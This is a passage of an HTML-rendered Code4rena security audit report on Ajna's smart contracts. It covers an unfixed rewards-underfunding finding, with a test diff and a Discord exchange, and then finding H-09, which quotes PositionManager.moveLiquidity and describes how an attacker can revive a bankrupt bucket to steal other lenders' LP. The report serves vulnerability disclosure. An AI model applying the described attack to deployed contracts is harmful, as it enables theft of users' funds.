epochsClaimed, reward);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.expectEmit(true, true, true, true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit Transfer(address(_rewardsManager), from, reward);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _rewardsManager.claimRewards(tokenId, currentBurnEpoch);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(_ajnaToken.balanceOf(from), fromAjnaBal + reward);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -267,8 +269,8 @@ abstract contract RewardsHelperContract is RewardsDSTestPlus {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _poolTwo       = ERC20Pool(_poolFactory.deployPool(address(_collateralTwo), address(_quoteTwo), 0.05 * 10**18));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // provide initial ajna tokens to staking rewards contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        deal(_ajna, address(_rewardsManager), 100_000_000 * 1e18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 100_000_000 * 1e18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        deal(_ajna, address(_rewardsManager), 40 * 1e18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 40 * 1e18); // @audit-issue RewardsManager is now underfunded, contains less AJNA than users&#39; rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // create a new test borrower with quote and collateral sufficient to draw a specified amount of debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4100e9f..3eaacd7 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -1843,6 +1843,15 @@ contract RewardsManagerTest is RewardsHelperContract {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertLt(_ajnaToken.balanceOf(_minterOne), tokensToBurn);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // try to claim again and get remaining rewards, will revert with `AlreadyClaimed()`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        _claimRewards({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            pool:          address(_pool),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            from:          _minterOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            tokenId:       tokenIdOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            reward:        40.899689081331351737 * 1e18,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            epochsClaimed: _epochsClaimedArray(1, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /********************/</span></span></span></code></pre>\n<p>Since the problem still exists, I am reporting it here. You can find below a conversation with Ian Harvey from the Ajna team, where we discuss how the problem was incorrectly marked as solved:</p>\n<blockquote>\n<p>aviggiano — Yesterday at 4:37 PM\nHi there<br>\nI am reviewing the Ajna smart contracts and I have a question regarding previous audit reports.<br>\n<a href=\"https://github.com/ajna-finance/audits\">https://github.com/ajna-finance/audits</a><br>\nIt seems like some findings are marked as “Fixed” but I believe they were not (see M-8).<br>\nShould I re-submit a previous finding, if the contract is in scope? or are those considered out of scope?<br>\nM-8 is this one<br>\n<a href=\"https://github.com/sherlock-audit/2023-01-ajna-judging/issues/120\">https://github.com/sherlock-audit/2023-01-ajna-judging/issues/120</a><br>\nIan Harvey | Ajna — Yesterday at 7:01 PM<br>\nChecking<br>\nIan Harvey | Ajna — Yesterday at 7:11 PM<br>\nThat was solved here -> <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L811\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L811</a></p>\n</blockquote>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Past audit report</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Consider reverting if there are insufficient Ajna tokens available as rewards. This is the best immediate solution to the problem.</li>\n<li>Create unit tests for each issue identified in the audit report and confirm that it has been properly addressed. This will prevent recurring problems where the development team believes an issue has been resolved, but in reality, it has not.</li>\n<li>Create a separate pull request for each finding and mark the issue in the audit table. This will help developers and auditors verify whether the issue has been resolved or not, and will make future audits more manageable, ultimately improving the overall quality and security of the protocol.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/251#issuecomment-1567506799\">Picodes (judge) increased severity to High</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/361#issuecomment-1555143539\">MikeHathaway (Ajna) confirmed via duplicate issue <code>#361</code></a></strong></p>\n<hr>\n<h2 id=\"h-09-user-can-avoid-bankrupting-by-calling-positionmanagermoveliquidity-where-to-index-is-bankrupted-index\" style=\"position:relative;\"><a href=\"#h-09-user-can-avoid-bankrupting-by-calling-positionmanagermoveliquidity-where-to-index-is-bankrupted-index\" aria-label=\"h 09 user can avoid bankrupting by calling positionmanagermoveliquidity where to index is bankrupted index permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/179\">[H-09] User can avoid bankrupting by calling <code>PositionManager.moveLiquidity</code> where to index is bankrupted index</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/179\">rvierdiiev</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/348\">J4de</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/111\">SpicyMeatball</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/17\">volodya</a></em></p>\n<p>Bucket could become insolvent and in that case all LP within the bucket are zeroed out (lenders lose all their LP). Because of that, <code>PositionManager.reedemPositions</code> <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L372\">will not allow to redeem index that is bankrupted</a>.</p>\n<p>When user wants to move his LPs from one bucket to another he can call <code>PositionManager.moveLiquidity</code> where he will provide from and to indexes.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L262-L333\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L262-L333</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">moveLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MoveLiquidityParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mayInteract</span><span class=\"mtk1\">(params_.pool, params_.tokenId) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MoveLiquidityLocalVars</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// handle the case where owner attempts to move liquidity after they&#39;ve already done so</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ensure bucketDeposit accounts for accrued interest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateInterest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// retrieve info of bucket from which liquidity is moved  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">bucketInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that bucket hasn&#39;t gone bankrupt since memorialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bankruptcyTime</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BucketBankrupt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// calculate the max amount of quote tokens that can be moved, given the tracked LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxQuote</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_lpToQuoteToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketCollateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bucketDeposit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_priceAt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">EnumerableSet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">UintSet</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positionIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// remove bucket index from which liquidity is moved from tracked positions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RemovePositionFailed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update bucket set at which a position has liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// slither-disable-next-line unused-return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">positionIndex</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// move quote tokens in pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">moveQuoteToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxQuote</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Position</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update position LP state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fromPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lps</span><span class=\"mtk1\">   += </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update position deposit time to the from bucket deposit time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">toPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MoveLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fromIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toIndex</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountFrom</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lpbAmountTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>As you can see <code>from</code> bucket is checked to be not bankrupted before the moving.<br>\nAnd after the move, LPs of <code>from</code> and <code>to</code> buckets are updated.<br>\nAlso <code>depositTime</code> of <code>to</code> bucket is updated to <code>from.depositTime</code>.<br></p>\n<p>The problem here is that <code>to</code> bucket was never checked to be not bankrupted.<br>\nBecause of that it’s possible that bankrupted <code>to</code> bucket now becomes not bankrupted as their depositTime is updated now.</p>\n<p>This is how this can be used by attacker.<br></p>\n<ol>\n<li>Attacker has lp shares in the bucket, linked to token and this bucket became bankrupt.</li>\n<li>Then attacker mints small amount of LP in the Pool and then memorizes this index to the token.</li>\n<li>Attacker calls <code>moveLiquidity</code> with <code>from</code>: new bucket and <code>to</code>: bankrupt bucket.</li>\n<li>Now attacker can redeem his lp shares from bankrupt bucket as depositedTime is updated now.</li>\n</ol>\n<p>As result, attacker was able to steal LPs of another people from <code>PositionManager</code> contract.</p>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 